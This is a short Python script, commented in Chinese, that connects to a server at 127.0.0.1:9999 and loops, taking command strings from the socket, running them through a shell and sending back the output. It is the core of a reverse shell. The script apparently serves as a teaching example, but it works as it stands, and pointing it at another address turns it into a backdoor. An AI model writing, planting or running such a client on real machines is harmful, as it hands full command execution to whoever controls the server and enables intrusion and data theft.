# 接收命令，执行命令并返回结果给服务器
import socket
from subprocess import Popen, PIPE

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 与服务器建立连接
    server_address = ('127.0.0.1', 9999)
    sock.connect(server_address)
    # 接收命令，执行命令并返回结果给服务器
    while True:
        cmd_str = sock.recv(4096).decode('gbk')
        run_command = Popen(cmd_str, shell=True, stdout=PIPE, stderr=PIPE)  # 执行命令
        result = run_command.stdout.read()  # 从管道符读取结果
        # 如果返回的结果为空，则表示命令错误
        if result == b'':
            result = "Command Error! Please Try again!".encode('gbk')
        sock.sendall(result)
        if cmd_str == 'exit':
            break
    sock.close()
